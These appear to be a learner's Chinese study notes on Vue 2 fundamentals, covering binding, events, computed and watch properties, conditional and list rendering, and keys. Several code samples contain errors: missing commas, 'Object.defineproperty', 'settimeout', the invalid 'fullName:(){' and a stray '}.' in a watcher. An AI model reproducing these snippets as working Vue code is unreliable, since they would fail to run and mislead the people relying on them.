# 初始vue

~~~VUE
Vue.config.productionTip = false
vue配置里面的生产模式提醒 关闭
~~~

~~~vue
{{}} 中写js表达式 且xxx可自动读取到data中的属性
==注意区分==
js表达式和js代码
a 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方
b 代码（语句） if（）{} for（）{}
~~~

一旦data中的数据发生变化，那么模板中用到改数据的地方也会自动更新

~~~vue
<html>
  <header>
  <script type="text/javascript" src="../js/vue.js"></script>
  </header>
  
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
      <h1>
        hello{{name,toUpperCase()}}
      </h1>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    new Vue({
      el:'#demo' //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      return {
name:'cess' }
    }
    })
  </script>
</html>
~~~



# 模板语法 数据绑定

## 模板语法

分为两大类

### 1.插值语法

功能：用于解析标签体内容

写法：{{xxx}}，xxx是js==表达式==，可以直接读取data中的所有区域

### 2.指令语法

功能：用于解析标签 （包括：标签属性、标签体内容、绑定事件….）】

距离：<a ==v-bind==:href=“xxx”> 或者简写为<a ：href="xxx">

xxx同样要写js表达式，可以直接读取到data中的属性

> 备注：Vue中有很多的指令，且形式都是：v-xxx，此处只拿v-bind举例

~~~vue
<html>
  <header>
  <script type="text/javascript" src="../js/vue.js"></script>
  </header>
  
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
      <h1>
        插值语法
      </h1>
      <h4>
        你好，{{name}}
      </h4>
      <hr />
      <h1>
        指令语法
      </h1>
      <h4>
        <a v-bind:href="tencent.url" x="hello">点我去看</a>
        <a :href="tencent.url" x="hello">点我去看</a>
      </h4>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    new Vue({
      el:'#demo' //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      return {
name:'lyy' 
      tencent:{
        name:'开端',
        url:'https://v.qq.com/x/cover/mzc00200mp8vo9b/n0041aa087e.html'
      }}
    }
    })
  </script>
</html>
~~~

## 数据绑定

Vue中有两种数据绑定方式

​	a.单向绑定v-bind  数据只能从data流向页面

​	b.双向绑定v-model 数据不仅能从data流向页面，还能从页面流向data

​	即可以修改data中声明的属性的值

> 备注：
>
> ​			a.双向绑定一般都在表单上，如==input====select====textarea==
>
> ​			b.双向绑定v-model：value 可以简写为v-model 因为v-model默认收集的就是value

~~~vue
<html>
  <header>
  <script type="text/javascript" src="../js/vue.js"></script>
    <title>数据绑定</title>
  </header>
  
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
			单向数据绑定<input type="text" v-bind:value="name"/>
     双向数据绑定<input type="text" v-model:value="name"/>
      
      简写
      单向数据绑定<input type="text" :value="name"/>
      双向数据绑定<input type="text" v-model="name"/>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    new Vue({
      el:'#demo' //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      return {
        name:'lyy' 
      tencent:{
        name:'开端',
        url:'https://v.qq.com/x/cover/mzc00200mp8vo9b/n0041aa087e.html'
      }
      }
    }
    })
  </script>
</html>
~~~

# el与data的两种写法

el有两种写法

​	a.创建Vue实例对象的时候配置el

​	b.先创建Vue实例，随后再通过vm.$mount(‘#root’) 指定el值

data有两种写法

​	a.对象式

> data:{}

​	b.函数式

> data(){return {} }

​	如何选择？

​	目前哪种写法都可以，以后到组件时，data必须使用函数式，否则报错

==一个很重要的原则==

由Vue管理的函数，一定不要写箭头函数，否则this就不是指向vm（即Vue实例）了

~~~vue
<html>
  <header>
  <script type="text/javascript" src="../js/vue.js"></script>
    <title>el和data的两种写法</title>
  </header>
  
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
			<h1>
        你好{{name}}
      </h1>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    
    //el的两种写法
    //const vm = new Vue({
      //el:"#root"
    //})
    //vm.$mount('#root')
    
    
    new Vue({
      el:'#demo' //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      //data两种写法
      // 1 .
      // data(){}
      // 2 .
      // data:{}
      return {
        name:'lyy' 
      	tencent:{
        name:'开端',
        url:'https://v.qq.com/x/cover/mzc00200mp8vo9b/n0041aa087e.html'
      }
      }
    }
    })
  </script>
</html>
~~~

# MVVM模型 数据代理

![img](https://cdn.nlark.com/yuque/0/2022/jpeg/1379492/1643097677438-36b4834c-18e8-4cd0-aa8e-c5f154e6bde0.jpeg?x-oss-process=image%2Fresize%2Cw_697%2Climit_0%2Finterlace%2C1)

## MVVM 模型

​	M：模型 model ，data中的数据

​	V：视图View 	模板代码

​	VM：视图模型 ViewModel Vue实例

观察发现：

​	data中所有属性，最后都出现在了vm身上

​	vm身上所有属性及Vue原型身上的所有属性，在Vue模型中都可以直接使用

~~~vue
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Document</title>
<script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
      <h2>
        名称：{{name}}
      </h2>
      <h2>
        测试:{{$options}}
      </h2>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    new Vue({
      el:'#demo', //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      return {
        name:'lyy' 
      }
    }
    })
  </script>
</html>
~~~

## Vue中的数据代理

==Object.defineproperty()==方法

~~~js
let number = 18
let person = {
	name: '张三',
  sex: '男'
}
Object.defineproperty(person,'age',{
  //注意：当使用了getter或setter方法，不允许使用writable和value这两个属性
  enumerable:true,  //控制属性是否可以枚举 默认值是false
  writable:true,   	//控制属性是否可以修改，默认值为false
  configurable:true	 //控制属性是否可以删除，默认值是false
  get(){
  console.log('有人读取age属性了')
  return number
	}
	set(value){
    console.log('有人修改age属性了')
    number = value
  }
})
console.log(person)
~~~

数据代理：通过一个对象代理对另一个对象中属性的操作

~~~js
let obj = {x:100}
let obj2 = {y:200}
Object.defineproperty(obj2,'x',{
  get () {
    return obj.x
  }
  set(value) {
  obj.x = value
}
})
~~~

![img](https://cdn.nlark.com/yuque/0/2022/png/1379492/1643033436297-5d2d61ec-ed69-4706-a98d-afdbd53b383d.png?x-oss-process=image%2Fresize%2Cw_1125%2Climit_0)

Vue将data中的数据拷贝了一份到_data属性中，又将 _data里面的属性提取到Vue实例中，(如name)，通过defineproperty 实现数据代理，这样通过getter/setter操作name，进而操作 _data中的name，而 _data又对data进行数据劫持，实现响应式

~~~html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Vue中的数据代理</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
  </head>
  <body>

    <div id="root">
      <h2>学校名称：{{ name }}</h2>
      <h2>学校地址：{{ address }}</h2>
    </div>

    <script type="text/javascript">
      Vue.config.productionTip = false

      const vm = new Vue({
        el: '#root',
        data: {
          name: '电子科技大学',
          address: '成都'
        }
      })
    </script>

  </body>
</html>
~~~

# 事件处理

## 事件的基本用法

​	1.使用==v-on:xxx==或者简写@xxx绑定事件，其中xxx是事件名

​	2.事件的回调需要配置在==methods==中，最终会在vm上

​	3.methods中配置的函数，不要用**箭头函数**，否则this就不是vm了

​	4.methods中配置的函数，都是被Vue管理的函，this指向的是vm或者组件实例化对象

​	5.@click=“demo”和@click=“demo($event)” 效果一致，但后者可以传参

~~~html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Vue中的数据代理</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
  </head>
  <body>
		<div id="root">
      <h2>欢迎来看{{ name }}的笔记</h2>
      <button @click="showInfo1">点我提示信息(不传参)</button>
      <button @click="showInfo2($event,66)">点我提示信息(传参)</button>
   	</div>
   	<script>
      Vue.config.productionTip = false
      new Vue({
        el:'#root',
        data(){
          return {
            name:'Lyy'
          }
        },
        methods:{
          showInfo1(event){
            console.log(event.target.innerText)
            alert('你好！')
          },
          showInfo2(event,number){
            console.log(event,number)
            console.log(event.target.innerText)
            alert('你好2！')
          }
        }
      })
   	</script>
  </body>
</html>
~~~

![image-20230714095041047](../AppData/Roaming/Typora/typora-user-images/image-20230714095041047.png)

## 事件修饰符

>==prevent==		阻止默认事件(常用)
>
>==stop==		      阻止事件冒泡(常用)
>
>==once==		     事件只能触发一次(常用)
>
>capture   	   使用事件的捕获模式
>
>self					只有event.target是当前操作的元素时才触发元素
>
>passive		    事件的默认行为立即执行，无需等待事件回调执行完毕

修饰符可以连续写，比如可以这样用：@click.prevent.stop = “showInfo”

~~~html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>事件修饰符</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
        <style>
            .demo1 {
                background-color: #ccc;
                margin-top: 10px;
                padding: 10px;
            }
            button {
                margin-top: 10px;
            }
            .box1 {
                background-color: orange;
                margin-top: 10px;
                padding: 10px;
            }
            .box2 {
                background-color: skyblue;
                padding: 10px;
            }
            .list {
                width: 200px;
                height: 200px;
                background-color: skyblue;
                overflow: auto;
            }
            li {
                height: 100px;
            }
        </style>
    </head>
    <body>
        <div id="root">
            <h2>欢迎来到{{name}}学习</h2>
            <!-- 阻止默认事件 -->
            <a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>
            <!-- 阻止事件冒泡 -->
            <div class="demo1" @click="showInfo">
                <button @click.stop="showInfo">点我提示信息</button>
                <!-- 修饰符可以连续写 -->
                <!-- <a href="http://www.baidu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
            </div>
            <!-- 事件只触发一次 -->
            <button @click.once="showInfo">点我提示信息</button>
            <!-- 事件的捕获模式 -->
            <div class="box1" @click.capture="showMsg(1)">
                div1
                <div class="box2" @click="showMsg(2)">div2</div>
            </div>

            <!-- 只有event.target时当前操作的元素时才触发事件 -->
            <div class="demo1" @click.self="showInfo">
                <div style="background-color: red" @click="showInfo">点我提示信息</div>
            </div>

            <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 -->
            <!-- scroll是滚动条滚动，passsive没有影响 -->
            <!-- wheel是鼠标滚轮滚动，passive有影响 -->
            <ul @wheel.passive="demo" class="list">
                <li>1</li>
                <li>2</li>
                <li>3</li>
                <li>4</li>
            </ul>
        </div>
        <script>
            Vue.config.productionTip = false
            new Vue({
                el: '#root',
                data: {
                    name: 'lyy'
                },
                methods: {
                    showInfo() {
                        alert('你好！')
                    },
                    showMsg(msg) {
                        console.log(msg)
                    },
                    demo() {
                        for (let i = 0; i < 100000; i++) {
                            console.log('#')
                        }
                        console.log('累坏了')
                    }
                }
            })
        </script>
    </body>
</html>

~~~

键盘事件

​	1.Vue中常用的按键别名

> 回车 enter
>
> 删除 delete 捕获删除和空格建
>
> 退出 esc
>
> 空格 space
>
> 换行 tab 特殊，必须配合keydown使用
>
> 上 up
>
> 下 down
>
> 左 left
>
> 右 right

​	2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意转为kebab-case（多单词小写短横线写法）

​	3.系统修饰键(用法特殊) ctrl alt shift meta（就是win）

​		a.配合keyup使用：按下修饰符的同时，再按下其他键，然后释放键帽，事件才被触发

​				指定ctrl + y 使用 @keyup.ctrl.y

​		b.	配合keydown使用：正常触发事件

​	4.也可以使用keyCode去指定具体的按键（不推荐）

​	5.Vue.config.keyCodes 自定义键名 = 键码  可以去定制案件别名

~~~html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>事件修饰符</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
        <style>
            .demo1 {
                background-color: #ccc;
                margin-top: 10px;
                padding: 10px;
            }

            button {
                margin-top: 10px;
            }

            .box1 {
                background-color: orange;
                margin-top: 10px;
                padding: 10px;
            }

            .box2 {
                background-color: skyblue;
                padding: 10px;
            }

            .list {
                width: 200px;
                height: 200px;
                background-color: skyblue;
                overflow: auto;
            }

            li {
                height: 100px;
            }
        </style>
    </head>

    <body>
        <div id="root">
            <h2>欢迎打开{{name}}的笔记</h2>
            <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo" />
            <hr />
            <input type="text" placeholder="按下tab提示输入" @keydown.tab="showInfo" />
            <hr />
            <input type="text" placeholder="按下回车提示输入" @keyup.huiche="showInfo" />
            <hr />
        </div>
        <script>
            Vue.config.productionTip = false
            Vue.config.keyCodes.huiche = 13
            new Vue({
                el: '#root',
                data: {
                    name: 'lyy'
                },
                methods: {
                    showInfo(e) {
                        e.target.value = e.target.placeholder
                        console.log(e.target.value)
                    }
                }
            })
        </script>
    </body>
</html>

~~~

![image-20230714111517868](../AppData/Roaming/Typora/typora-user-images/image-20230714111517868.png)

# 计算属性 侦听属性

## 计算属性

1.插值语法实现

~~~html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>事件修饰符</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
        <style>
            .demo1 {
                background-color: #ccc;
                margin-top: 10px;
                padding: 10px;
            }

            button {
                margin-top: 10px;
            }

            .box1 {
                background-color: orange;
                margin-top: 10px;
                padding: 10px;
            }

            .box2 {
                background-color: skyblue;
                padding: 10px;
            }

            .list {
                width: 200px;
                height: 200px;
                background-color: skyblue;
                overflow: auto;
            }

            li {
                height: 100px;
            }
        </style>
    </head>

    <body>
        <div id="root">
            姓：<input type="text" v-model="firstname" /> <hr>
            名：<input type="text" v-model="lastname" /> <hr>
            全名：<span>{{firstname}}-{{lastname}}</span>
        <script>
            Vue.config.productionTip = false
            new Vue({
                el: '#root',
                data: {
                    firstname:'张',
                    lastname:'三'
                },
            })
        </script>
    </body>
</html>

~~~

2.methods实现

数据发生变化，模板就会被重新解析

~~~html
        <title>methods实现</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    </head>

    <body>
        <div id="root">
            姓：<input type="text" v-model="firstname" />
            <hr />
            名：<input type="text" v-model="lastname" />
            <hr />
            全名：<span>{{fullName()}}</span>
        </div>
        <script>
            Vue.config.productionTip = false
            new Vue({
                el: '#root',
                data: {
                    firstname: '张',
                    lastname: '三'
                },
                methods: {
                    fullName() {
                        return this.firstname + '-' + this.lastname
                    }
                }
            })
        </script>
    </body>
</html>

~~~

3.computed 计算属性

​	1.定义：要用的属性不存在，需要通过已有属性计算得来

​	2.原理：底层借助了Object.defineproperty() 方法提供的getter和setter

​	3.get 函数什么时候指向？

​		a.初次读取时会指向一次

​		b.当依赖的数据发生变化时会被再次调用

​	4.优势：与methods相比，内部有缓存机制（复用），效率更高，调试方便

​	5.备注

​		a.计算属性最总会出现在vm上，直接读取就行

​		b.如果计算属性要被修改，那必须写set函数去响应修改，且set要引起计算时依赖的数据发生变化

​		c.如果计算属性确定不考虑修改，可以用计算属性的简写形式

~~~html
   <title>姓名案例——computed实现</title>
   <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    </head>

    <body>
        <div id="root">
            姓：<input type="text" v-model="firstname" />
            <hr />
            名：<input type="text" v-model="lastname" />
            <hr />
            全名：<span>{{fullName}}</span>
        </div>
        <script>
            Vue.config.productionTip = false
            const vm = new Vue({
                el: '#root',
                data: {
                    firstname: '张',
                    lastname: '三'
                },
                computed: {
                    // 完整写法：
                    // fullName: {
                    //     get() {
                    //         console.log('get被调用了')
                    //         return this.firstname + '-' + this.lastname
                    //     },
                    //     set(value) {
                    //         console.log('set被调用了')
                    //         const arr = value.split('-')
                    //         this.firstname = arr[0]
                    //         this.lastname = arr[1]
                    //     }
                    // }

                    // 简写
                    fullName() {
                        console.log('get被调用了')
                        return this.firstname + '-' + this.lastname
                    }
                }
            })
        </script>
~~~

## 侦听属性

~~~html
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>天气案例</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <h3>今天天气很{{info}}</h3>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWeather">切换天气</button>
    </div>
<script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            }
        })
</script>
~~~

### 侦听属性基本用法

### watch监视属性

1.当被监视的变化时,回调函数自动调用，进行相关操作

2.监视的属性必须存在，才能进行监视，既可以监视data，也可以监视计算属性

3.配置项属性 ==immediate：false==，改为true，则初始化时调用一次handler(newvalue,oldvalue)

4.监视有两种写法

​	a. 创建Vue时传入warch：{}配置

​	b.通过vm.$watch()监视

~~~html
    <title>天气案例-监视属性</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <h3>今天天气很{{info}}</h3>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWeather">切换天气</button>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            //方式一
            // watch: {
            //     isHot: {
            //         immediate: true,
            //         handler(newvalue, oldvalue) {
            //             console.log('isHot被修改了', newvalue, oldvalue)
            //         }
            //     }
            // }
        })

        //方式二
        vm.$watch('isHot', {
            immediate: true,
            handler(newvalue, oldvalue) {
                console.log('isHot被修改了', newvalue, oldvalue)
            }
        })
    </script>
~~~

### 深度侦听

​	1.Vue中的watch默认不监测对象内部值的改变(只监视表面一层)

​	2.再watch中配置deep：true可以监测对象内内部值的改变

注意：

​	1.Vue自身可以监测对象内部值的改变，但是Vue提供的默认值不可以

​	2.使用watch时根据监视数据的具体结构，决定是否使用深度监视



~~~html
<title>天气案例-深度监视</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <h3>a的值是:{{ numbers.a }}</h3>
        <button @click="numbers.a++">点我让a+1</button>
        <h3>b的值是:{{ numbers.b }}</h3>
        <button @click="numbers.b++">点我让b+1</button>
        <button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
        {{numbers.c.d.e}}
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                numbers: {
                    a: 1,
                    b: 1,
                    c: {
                        d: {
                            e: 100
                        }
                    }
                }
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            watch: {
                // isHot: {
                //     immediate: true,
                //     handler(newvalue, oldvalue) {
                //         console.log('isHot被修改了', newvalue, oldvalue)
                //     }
                // }
                numbers: {
                    immediate: true,
                    deep: true,
                    handler(newvalue, oldvalue) {
                        console.log('numbers改变了')
                    }
                }
            }
        })
    </script>
~~~

![image-20230714202215407](../AppData/Roaming/Typora/typora-user-images/image-20230714202215407.png)



### 侦听属性简写

如果侦听属性除了handler属性没有其他配置项的话，可以进行简写

~~~html
watch:{
	isHot(newvalue,oldvalue){
		console.log('isHot被修改了',newvalue,oldvalue)
}
}
~~~

## 计算属性vs监听属性

computed和watch之间的区别

- ==computed==能完成的功能，==watch==也能够完成

- ==watch==能完成的功能，==computed==不一定能够完成

两个重要的小原则

- 所有被Vue管理的函数，最好写城普通函数，这样this的指向才是vm或者组件实例对象
- 所有不被Vue管理的函数，(定时器的回调函数、ajax的回调函数、Promise的回调函数)最好写成箭头函数，这样this的指向才是vm或者组件实例对象![image-20230714202942366](../AppData/Roaming/Typora/typora-user-images/image-20230714202942366.png)

使用计算属性

~~~js
new Vue({
  el:'#root',
  data:{
    firstname:'zhang',
    lastname:'san'
  },
  computed:{
    fullName:(){
    return this.firstname + '-' + this.lastname
  }
  }
})
~~~



使用监听属性

~~~js
new Vue({
  el:'#root',
  data:{
    firstname:'张',
    lastname:"三",
    fullname:'张-三'
  },
  watch:{
    firstname(val){
      settimeout(()=>{
        this.fullname=val+'-'+this.lastname
      },1000)
    }.
    lastname(val){
  		this.fullname=this.firstname+'-'+val
		}
  }
})
~~~

# 绑定样式 条件渲染

## 绑定样式

class样式

- ​	写法==:class=“”==,xxx可以是字符串，数组，对象
- ==:style===“[a,b]” 其中a、b是样式对象
- :style  =  “{fontSize:xxx}” 其中xxx是动态值
  - 字符串写法适用于：类名不确定，要动态获取
  - 数组写法适用于：要绑定多个样式，个数不确定，名字也不确定
  - 对象写法适用于：要绑定多个样式，个数确定，名字确定，但不确定用不用

~~~html
 <style>
        .basic {
            width: 300px;
            height: 50px;
            border: 1px solid black;
        }

        .happy {
            border: 3px solid red;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg, yellow, pink, orange, yellow);
        }

        .sad {
            border: 4px dashed rgb(2, 197, 2);
            background-color: skyblue;
        }

        .normal {
            background-color: #bfa;
        }

        .atguigu1 {
            background-color: yellowgreen;
        }

        .atguigu2 {
            font-size: 20px;
            text-shadow: 2px 2px 10px red;
        }

        .atguigu3 {
            border-radius: 20px;
        }
    </style>
</head>

<body>
    <div id="root">
        <!-- 绑定class样式，-字符串写法。适用于：样式类名不确定，需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div><br><br>

        <!-- 绑定class，数组写法，适用于：要绑定的样式个数不确定，名字也不确定 -->
        <div class="basic" :class="classArr">{{name}}</div><br><br>

        <!-- 绑定class样式，对象写法，适用于：要绑定的样式确定，名字确定，但不确定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div><br><br>
        <!-- 绑定style样式--对象写法 -->
        <div class="basic" :style="styleObj">{{name}}</div><br><br>
        <!-- 绑定style样式--数组写法 -->
        <div class="basic" :style="styleArr">{{name}}</div>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                mood: 'normal',
                classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
                classObj: {
                    atguigu1: false,
                    atguigu2: false
                },
                styleObj: {
                    fontSize: '40px',
                    color: 'red'
                },
                styleObj2: {
                    backgroundColor: 'orange'
                },
                styleArr: [
                    {
                        fontSize: '40px',
                        color: 'blue'
                    },
                    {
                        backgroundColor: "gray"
                    }
                ]
            },
            methods: {
                changeMood() {
                    const arr = ['happy', 'sad', 'normal']
                    const index = Math.floor(Math.random() * 3)
                    this.mood = arr[index]
                }
            },
        })
    </script>
~~~

![image-20230714205006998](../AppData/Roaming/Typora/typora-user-images/image-20230714205006998.png)

## 条件渲染

### v-if 

​	写法跟if else 语法类似

​	v-if=“表达式”

​	v-else-if=“表达式”

​	v-else

适用于：切换频率较低的场景

注意：v-if和v-else-if和v-else 一起使用，但要求其结构不能被打断

### v-show

​	写法：v-show=“表达式”

​	适用于：切换频率较高的场景

​	特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉display：none

==备注==：使用v-if的时候，元素可能无法获取到，而使用v-show一定可以获取到

> template标签不影响结构，页面html中不会有此标签，但只能配合v-if 不能配合v-show

~~~js
    <div id="root">
        <h2>当前n的值是{{n}}</h2>
        <button @click="n++">点我n+1</button>

        <!-- 使用v-show条件渲染 -->
        <!-- <h2 v-show="false">欢迎来到{{name}}</h2>
        <h2 v-show="1==1">欢迎来到{{name}}</h2> -->

        <!-- 使用v-if条件渲染 -->
        <!-- <h2 v-if="false">欢迎来到{{name}}</h2>
        <h2 v-if="1===1">欢迎来到{{name}}</h2> -->

        <!-- v-if和v-show -->
        <!-- <div v-show="n===1">angular</div>
        <div v-show="n===2">React</div>
        <div v-show="n===3">Vue</div> -->

        <!-- v-else和v-else-if -->
        <div v-if="n===1">angular</div>
        <div v-else-if="n===2">React</div>
        <div v-else-if="n===3">Vue</div>
        <div v-else>haha </div>


    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                name: " lyy", n: 0
            },
        }) 
    </script>
~~~

# 列表渲染 数据监视

## 列表渲染

### 基本列表

==v-for==指令

- 用于展示列表数据
- 语法：<li v-for="(item,index) of item" :key="index">这里key可以是index，更好的是遍历对象的唯一标识
- 可遍历：数组、对象、字符串(用的少)、指定次数（用的少）

~~~js
<body>
    <div id="root">
        <!-- 遍历数组 -->
        <h3>人员列表（遍历数组）</h3>
        <ul>
            <li v-for="(p,index) of person" :key="index">{{p.name}}-{{p.age}}</li>
        </ul>
        <!-- 遍历对象 -->
        <h3>汽车信息(遍历对象)</h3>
        <ul>
            <li v-for="(value,key) of car" :key="key">{{key}}-{{value}}</li>
        </ul>
        <!-- 遍历字符串 -->
        <h3>测试遍历字符串</h3>
        <ul>
            <li v-for="(char,index) of str" :key="index">{{char}}-{{index}}</li>
        </ul>
        <!-- 遍历指定次数 -->
        <h3>遍历指定次数</h3>
        <ul>
            <li v-for="(number,index) of 5" :key="index">{{index}}-{{number}}</li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                person: [
                    { id: '001', name: '张三', age: 18 },
                    { id: '002', name: 'lisi', age: 19 },
                    { id: '003', name: 'wangwu', age: 20 }
                ],
                car: {
                    name: '奥迪a8',
                    price: "70w",
                    color: '黑色'
                },
                str: 'hello'
            },
        }) 
    </script>
~~~

![image-20230714211320091](../AppData/Roaming/Typora/typora-user-images/image-20230714211320091.png)



## key的作用与原理

![img](https://cdn.nlark.com/yuque/0/2022/png/1379492/1643033767087-2558e992-b48b-4b54-a9b8-86eb8534bd98.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/1379492/1643033764359-6a37a493-bb51-4b3b-8b14-822a3df68d6e.png)

面试题：react vue中的key有什么作用？(key的内部原理)

​	1.虚拟dom中key的作用：key是虚拟DOM中对象的表示，当数据放生变化时，vue会根据新数据生成新的虚拟dom，锁喉vue进行新虚拟DOM与旧虚拟DOM的差异比较，比较规则如下

#### 	2.对比规则

​		a.旧 虚拟DOM 中找到了与新 虚拟DOM 相同的 Key

​			1.若虚拟DOM 中内容没变，直接使用之前的真实DOM

​			2.若虚拟DOM 中内容改变，则生成新的真实DOM ，随后替换掉页面中之前的真实DOM

#### 	3.用index作为key可能会引发的问题

​		a.若对数据进行逆序添加、逆序删除等==破坏顺序操作==，会产生没有必要的==真实DOM== 更新===》页面效果没问题，但是效率低

​		b.若结构中还包括==输入类的dom== ：会产生错误==dom==更新==》界面有问题

#### 	4.开发中如何选择key？

​			a.最好使用每条数据的==唯一标识==作为==key==，比如id，手机号，身份证号码，学号等唯一值

​			b.如果不存在对数据的逆序添加删除等破坏顺序的操作，仅用于渲染列表，使用==index==作为==key==是没有问题的

~~~js
<body>
    <div id="root">
        <!-- 遍历数组 -->
        <h3>人员列表（遍历数组）</h3>
        <button @click.once="add">添加一个老刘</button>
        <ul>
            <li v-for="(p,index) of person" :key="index">{{p.name}}-{{p.age}}<input type="text"></li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                person: [
                    { id: '001', name: '张三', age: 18 },
                    { id: '002', name: 'lisi', age: 19 },
                    { id: '003', name: 'wangwu', age: 20 }
                ],
            },
            methods: {
                add() {
                    const p = { id: "004", name: '老刘', age: 40 }
                    this.person.unshift(p)
                }
            }
        }) 
    </script>
~~~

![image-20230714212428779](../AppData/Roaming/Typora/typora-user-images/image-20230714212428779.png)

## 列表过滤

~~~html
<body>
    <div id="root">
        <!-- 遍历数组 -->
        <h3>人员列表</h3>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <li v-for="(p,index) of filPersons" :key="p.id">
                {{ p.name }}-{{ p.age }}-{{ p.sex }}
            </li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        // 用watch实现
        // new Vue({
        //     el: '#root',
        //     data: {
        //         keyWord: '',
        //         person: [
        //             { id: '001', name: '马冬梅', age: 19, sex: '女' },
        //             { id: '002', name: '周冬雨', age: 20, sex: '女' },
        //             { id: '003', name: '周杰伦', age: 21, sex: '男' },
        //             { id: '004', name: '温兆伦', age: 22, sex: '男' }
        //         ],
        //         filPerson: []
        //     },
        //     watch: {
        //         keyWord: {
        //             immediate: true,
        //             handler(val) {
        //                 this.filPersons = this.person.filter((p) => {
        //                     return p.name.indexOf(val) !== -1
        //                 })
        //             }
        //         }
        //     }
        // }

        // 用computed实现
        new Vue({
            el: '#root',
            data: {
                keyWord: '',
                person: [
                    { id: '001', name: '马冬梅', age: 19, sex: '女' },
                    { id: '002', name: '周冬雨', age: 20, sex: '女' },
                    { id: '003', name: '周杰伦', age: 21, sex: '男' },
                    { id: '004', name: '温兆伦', age: 22, sex: '男' }
                ],
                filPerson: []
            },
            computed: {
                filPersons() {
                    return this.person.filter((p) => {
